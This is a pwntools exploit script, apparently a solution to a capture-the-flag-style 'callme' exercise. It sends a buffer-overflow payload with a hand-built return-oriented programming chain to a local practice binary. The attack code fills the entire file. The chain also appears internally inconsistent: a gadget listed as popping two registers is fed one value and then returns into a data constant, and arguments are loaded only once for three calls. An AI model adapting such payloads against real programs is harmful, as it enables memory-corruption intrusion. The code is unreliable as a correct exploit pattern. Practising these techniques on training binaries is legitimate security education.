#!/usr/bin/env python3

"""Exploiting callme

Creates ROP chain to make successive PLT calls

Usage: $ python3 callme.py
"""

import sys

from pwn import *

context.log_level = "DEBUG"
context.binary = "./callme"

p = gdb.debug(context.binary.path, gdbscript="init-gef")
# p = process(context.binary.path)

g_rdi = 0x40093c # pop rdi; ret;
g_rsi = 0x40093d # pop rsi; pop rdx; ret;
g_rdx = 0x40093e # pop rdx; ret;
g_ret = 0x4006be # ret;

g_callme_one = 0x400720 # callme_one
g_callme_two = 0x400740 # callme_two
g_callme_thr = 0x4006f0 # callme_three
"""
g_callme_one = 0x601040 # callme_one
g_callme_two = 0x601050 # callme_two
g_callme_thr = 0x601028 # callme_three
"""
arg_one = 0xdeadbeefdeadbeef
arg_two = 0xcafebabecafebabe
arg_thr = 0xd00df00dd00df00d

payload = b"a" * (40)
payload += p64(g_rdi)
payload += p64(arg_one)
payload += p64(g_rsi)
payload += p64(arg_two)
payload += p64(g_rdx)
payload += p64(arg_thr)
payload += p64(g_callme_one)
payload += p64(g_callme_two)
payload += p64(g_callme_thr)

p.sendline(payload)
p.interactive()
